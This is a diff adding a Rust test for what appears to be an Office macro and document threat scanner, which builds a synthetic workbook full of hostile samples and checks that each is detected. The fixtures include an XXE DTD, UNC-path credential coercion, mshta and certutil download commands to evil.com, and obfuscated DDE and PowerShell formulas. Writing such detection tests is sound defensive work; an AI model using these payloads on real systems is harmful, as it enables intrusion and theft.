@@ -5180,3 +5180,214 @@ fn e2e_slicer_bibliography_xpath_and_hyperbolic_math_threat_inspection() {
         "JSON missing VBA-CELL-052"
     );
 }
+
+#[test]
+fn e2e_xmlmaps_comments_themes_and_matrix_math_threat_inspection() {
+    let xml_maps = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<MapInfo xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" SelectionNamespaces="">
+  <Schema ID="Schema1">
+    <xsd:schema targetNamespace="\\attacker.com\share\schema.xsd" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+      <!DOCTYPE xxe [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">]>
+      <xsd:annotation>
+        <xsd:documentation>powershell -enc AAAA</xsd:documentation>
+      </xsd:annotation>
+    </xsd:schema>
+  </Schema>
+  <Map ID="1" Name="MaliciousMap" RootElement="Root" SchemaID="Schema1"/>
+</MapInfo>"#;
+
+    let table1 = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<table xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" id="1" name="Table1" displayName="Table1" ref="A1:B10">
+  <tableColumns count="1">
+    <tableColumn id="1" name="Col1">
+      <xmlColumnPr xmlDataType="string" xpath="document('http://evil.com/payload.xml')"/>
+    </tableColumn>
+  </tableColumns>
+</table>"#;
+
+    let word_comments = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:comments xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:comment w:id="1" w:author="Attacker">
+    <w:p>
+      <w:r><w:t>mshta http://evil.com/payload.hta</w:t></w:r>
+      <w:r><w:t>\\credential-coercion.corp\share\avatar.png</w:t></w:r>
+    </w:p>
+  </w:comment>
+</w:comments>"#;
+
+    let comments_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="powershell:Invoke-WebRequest" TargetMode="External"/>
+</Relationships>"#;
+
+    let theme1 = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
+  <a:themeElements>
+    <a:fontScheme name="Office">
+      <a:majorFont>
+        <a:latin typeface="\\attacker.evil\share\malicious_font.ttf"/>
+      </a:majorFont>
+    </a:fontScheme>
+  </a:themeElements>
+</a:theme>"#;
+
+    let theme_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="http://evil.com/remote_theme.thmx" TargetMode="External"/>
+</Relationships>"#;
+
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "XmlMapsContainerProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    // Formulas using MMULT, SEC, COT, SECH for de-obfuscation
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>IF(MMULT({1, 2}, {3; 4})=11, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>
+      <c r="B1"><f>CONCAT(IF(SEC(0)=1, &quot;powershell&quot;, &quot;&quot;), IF(ROUND(COT(PI() / 4), 0)=1, &quot; -enc&quot;, &quot;&quot;))</f></c>
+      <c r="C1"><f>IF(SECH(0)=1, &quot;certutil -urlcache -split -f http://evil.com/payload.exe&quot;, &quot;&quot;)</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("xl/xmlMaps.xml", xml_maps.as_bytes()),
+        ("xl/tables/table1.xml", table1.as_bytes()),
+        ("word/comments.xml", word_comments.as_bytes()),
+        ("word/_rels/comments.xml.rels", comments_rels.as_bytes()),
+        ("word/theme/theme1.xml", theme1.as_bytes()),
+        ("word/theme/_rels/theme1.xml.rels", theme_rels.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify XML Maps & Table threats (VBA-CELL-053)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "XmlMapsOrSchemaDefinitionAnomaly"
+                && (t.coordinate.contains("xmlMap:uncPath")
+                    || t.coordinate.contains("xmlMap:xxeDtdDeclaration")
+                    || t.coordinate.contains("xmlMap:commandExecution")
+                    || t.coordinate.contains("xmlMap:xpathSsrf"))),
+        "Should detect XmlMapsOrSchemaDefinitionAnomaly (VBA-CELL-053): {threats:?}"
+    );
+
+    // 2. Verify Document Comment & Modern Annotation threats (VBA-CELL-054)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "CommentAnnotationOrAuthorAnomaly"
+                && (t.coordinate.contains("comment:uncPath")
+                    || t.coordinate.contains("comment:dangerousProtocol")
+                    || t.coordinate.contains("comment:shellCommand")
+                    || t.formula.contains("mshta"))),
+        "Should detect CommentAnnotationOrAuthorAnomaly (VBA-CELL-054): {threats:?}"
+    );
+
+    // 3. Verify Theme Font & Effect Coercion threats (VBA-CELL-055)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ThemeFontOrEffectCoercionAnomaly"
+                && (t.coordinate.contains("theme:uncTypeface")
+                    || t.coordinate.contains("theme:remoteTemplateInjection"))),
+        "Should detect ThemeFontOrEffectCoercionAnomaly (VBA-CELL-055): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through MMULT: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through SEC/COT evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through SECH evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-053, VBA-CELL-054, VBA-CELL-055
+    let sarif = inspection_to_sarif(&inspection, "file:///test/xmlmaps_comments_themes.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-053"),
+        "SARIF must contain VBA-CELL-053 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-054"),
+        "SARIF must contain VBA-CELL-054 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-055"),
+        "SARIF must contain VBA-CELL-055 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-053, VBA-CELL-054, VBA-CELL-055
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-053\""),
+        "JSON missing VBA-CELL-053"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-054\""),
+        "JSON missing VBA-CELL-054"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-055\""),
+        "JSON missing VBA-CELL-055"
+    );
+}
